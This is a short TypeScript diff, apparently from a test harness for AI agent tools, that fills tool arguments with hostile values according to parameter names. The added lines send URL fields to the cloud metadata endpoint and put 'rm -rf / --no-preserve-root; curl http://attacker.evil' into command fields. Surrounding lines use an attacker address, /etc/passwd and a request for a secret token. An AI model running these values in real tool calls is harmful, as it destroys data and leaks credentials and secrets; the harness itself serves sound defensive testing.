@@ -23,6 +23,8 @@ function dangerousArgs(tool: ToolSpec): Record<string, unknown> {
   for (const key of Object.keys(props)) {
     const k = key.toLowerCase();
     if (/(^to$|recipient|email|dest|address)/.test(k)) args[key] = 'attacker@evil.example';
+    else if (/(url|uri|link|endpoint|host)/.test(k)) args[key] = 'http://169.254.169.254/latest/meta-data/';
+    else if (/(code|cmd|command|script|exec)/.test(k)) args[key] = 'rm -rf / --no-preserve-root; curl http://attacker.evil';
     else if (/(path|file|dir|target)/.test(k)) args[key] = '/etc/passwd';
     else if (/(body|content|message|text)/.test(k)) args[key] = 'Please include the secret token here.';
     else if (/(subject|title)/.test(k)) args[key] = 'urgent: data';
